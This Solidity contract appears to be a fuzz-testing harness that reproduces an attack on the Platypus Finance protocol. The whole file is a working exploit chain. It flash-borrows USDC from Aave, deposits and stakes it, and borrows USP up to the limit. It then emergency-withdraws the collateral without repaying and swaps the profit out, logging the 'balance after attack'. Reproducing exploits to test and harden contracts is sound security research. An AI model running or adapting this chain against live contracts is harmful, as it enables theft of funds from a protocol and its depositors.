// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;

import "./libraries/Constants.sol";
import { IERC20 } from "forge-std/interfaces/IERC20.sol";
import "./interfaces/IMasterPlatypusV4.sol";
import "./interfaces/IPlatypusPool.sol";
import "./interfaces/IPlatypusTreasure.sol";
import "./interfaces/IAaveFlashloan.sol";
import "forge-std/console.sol";



contract Handler {

    IERC20 USDC = IERC20(Constants.USDC);
    IERC20 USP = IERC20(Constants.USP);
    IERC20 USDC_E = IERC20(Constants.USDC_E);
    IERC20 USDT = IERC20(Constants.USDT);
    IERC20 USDT_E = IERC20(Constants.USDT_E);
    IERC20 BUSD = IERC20(Constants.BUSD);
    IERC20 DAI_E = IERC20(Constants.DAI_E);
    IERC20 LPUSDC = IERC20(Constants.LPUSDC);
    PlatypusPool Pool = PlatypusPool(Constants.PLATYPUS_POOL);
    MasterPlatypusV4 Master = MasterPlatypusV4(Constants.PLATYPUS_MASTERPLATYPUSV4);
    PlatypusTreasure Treasure = PlatypusTreasure(Constants.PLATYPUS_TREASURE);
    IAaveFlashloan aaveV3 = IAaveFlashloan(Constants.AAVE_V3);


    bool emergency = false;

    constructor() {}

    function fuzz(
        uint256 _amount, 
        bool _emergencyWithdraw
    ) external returns (bool) {
        
        emergency = _emergencyWithdraw;
        uint256 amount = (_amount <= 44_000_000 * 1e6) ? _amount : 44_000_000;
        
        aaveV3.flashLoanSimple(address(this), address(USDC), amount, new bytes(0), 0);

    }

    function  executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {

        USDC.approve(address(aaveV3), amount + premium);
        
        USDC.approve(address(Pool), amount);
        
        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
        
        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));
        
        LPUSDC.approve(address(Master), LPUSDCAmount);
        
        Master.deposit(4, LPUSDCAmount);
        
        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
        
        uint256 borrowAmount = Position.borrowLimitUSP;
        
        Treasure.borrow(address(LPUSDC), borrowAmount);

        if (emergency) {
            try Master.emergencyWithdraw(4) {} catch {
                USP.approve(address(Treasure), borrowAmount);
                Treasure.repay(address(LPUSDC), borrowAmount);
                Master.emergencyWithdraw(4);
            }
        } else {
            try Master.withdraw(4, LPUSDCAmount) {} catch {
                USP.approve(address(Treasure), borrowAmount);
                Treasure.repay(address(LPUSDC), borrowAmount);
                Master.withdraw(4, LPUSDCAmount);
            }
        } 

        console.log("balance after attack");
        console.log(USP.balanceOf(address(this)));
        if (USP.balanceOf(address(this)) > 0) {
            USP.approve(address(Pool), USP.balanceOf(address(this)));
            Pool.swap(address(USP), address(USDT), USP.balanceOf(address(this)), 0, address(this), block.timestamp);
        }

        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
        
        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); 

        return true;
    }

}